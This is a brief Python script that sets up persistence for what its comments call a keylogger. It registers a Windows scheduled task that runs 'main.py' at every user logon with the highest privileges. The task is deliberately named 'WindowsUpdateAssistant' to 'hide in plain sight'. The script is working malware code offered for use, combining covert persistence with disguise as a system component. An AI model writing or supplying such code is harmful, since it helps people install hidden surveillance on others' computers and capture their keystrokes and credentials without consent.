import os
import sys
import subprocess
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_persistence():
    # 1. Get the path to your main.py (or the .exe later)
    # We'll use the absolute path so Windows always finds it
    app_path = os.path.abspath("main.py") 
    python_path = sys.executable # Path to your python.exe
    
    task_name = "WindowsUpdateAssistant" # A generic name to hide in plain sight
    
    # 2. Command to create a Task Scheduler entry
    # /sc onlogon = Run when any user logs in
    # /rl highest = Run with Admin privileges (needed for keylogging)
    # /tr = The command to run
    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{python_path}\" \"{app_path}\"" /sc onlogon /rl highest /f'
    
    if not is_admin():
        print("Please run this CMD as Administrator to set up persistence!")
        return

    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"SUCCESS: {task_name} created. Project will now start automatically.")
    except Exception as e:
        print(f"ERROR: Could not create task: {e}")

if __name__ == "__main__":
    create_persistence()